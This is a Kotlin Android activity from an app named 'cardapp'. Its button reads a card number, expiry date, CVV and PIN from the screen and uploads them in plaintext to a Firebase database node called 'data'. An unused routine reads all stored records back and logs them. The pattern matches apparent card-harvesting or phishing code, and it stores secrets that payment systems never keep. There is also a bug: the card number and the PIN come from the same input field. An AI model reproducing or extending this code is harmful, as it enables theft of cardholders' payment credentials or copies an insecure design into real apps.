package com.example.cardapp

import android.os.Bundle
import android.util.Log
import android.widget.Button
import android.widget.EditText
import androidx.activity.enableEdgeToEdge
import androidx.appcompat.app.AppCompatActivity
import androidx.core.view.ViewCompat
import androidx.core.view.WindowInsetsCompat
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.DatabaseReference
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.ValueEventListener

data class CardDetails(
    var cardNumber: String? = null,
    var expiryDate: String? = null,
    var cvv: String? = null,
    var pin: String? = null
)

class ThirdActivity : AppCompatActivity() {
    private var firebaseDatabase: FirebaseDatabase? = null
    private var databaseReference: DatabaseReference? = null
    private val list = mutableListOf<CardDetails>()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()
        setContentView(R.layout.activity_third)
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main)) { v, insets ->
            val systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars())
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom)
            insets
        }

        firebaseDatabase = FirebaseDatabase.getInstance()
        databaseReference = firebaseDatabase?.getReference("data")

        val btnThirdActivity = findViewById<Button>(R.id.button3)
        btnThirdActivity.setOnClickListener {
            // Fetching values from UI
            val cardNumberEditText = findViewById<EditText>(R.id.gsnNumber4)
            val expiryDateEditText = findViewById<EditText>(R.id.mm_yy)
            val cvvEditText = findViewById<EditText>(R.id.editTextNumber)
            val pinEditText = findViewById<EditText>(R.id.gsnNumber4)

            val cardNumber = cardNumberEditText.text.toString()
            val expiryDate = expiryDateEditText.text.toString()
            val cvv = cvvEditText.text.toString()
            val pin = pinEditText.text.toString()

            saveData(cardNumber, expiryDate, cvv, pin)
        }
    }

    private fun saveData(cardNumber: String, expiryDate: String, cvv: String, pin: String) {
        val cardDetails = CardDetails(cardNumber = cardNumber, expiryDate = expiryDate, cvv = cvv, pin = pin)
        val key = databaseReference?.push()?.key
        key?.let { databaseReference?.child(it)?.setValue(cardDetails) }
    }

    private fun getData() {
        databaseReference?.addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                Log.d("ThirdActivity", "onDataChange: $snapshot")
                list.clear()

                for (ds in snapshot.children) {
                    val cardNumber = ds.child("cardNumber").getValue(String::class.java) ?: ""
                    val expiryDate = ds.child("expiryDate").getValue(String::class.java) ?: ""
                    val cvv = ds.child("cvv").getValue(String::class.java) ?: ""
                    val pin = ds.child("pin").getValue(String::class.java) ?: ""

                    val cardDetails = CardDetails(cardNumber = cardNumber, expiryDate = expiryDate, cvv = cvv, pin = pin)
                    list.add(cardDetails)
                }

                Log.d("ThirdActivity", "Size: ${list.size}")
            }

            override fun onCancelled(error: DatabaseError) {
                Log.d("ThirdActivity", "onCancelled: ${error.toException()}")
            }
        })
    }
}
